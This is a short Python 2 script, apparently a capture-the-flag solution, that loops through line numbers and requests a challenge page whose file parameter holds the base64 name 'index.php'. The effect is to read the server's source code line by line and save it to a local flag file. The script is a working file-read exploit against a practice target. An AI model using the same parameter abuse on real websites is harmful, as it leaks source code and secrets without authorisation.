'''
@author: wenhuizone
'''
import requests
file=open('d:/flag.txt','a')

for i in range(0,40):
    url='http://ctf.idf.cn/game/web/40/index.php?line='+str(i)+'&file=aW5kZXgucGhw'
    wp=requests.get(url)
    print wp.text
    file.write(wp.text)
file.close()
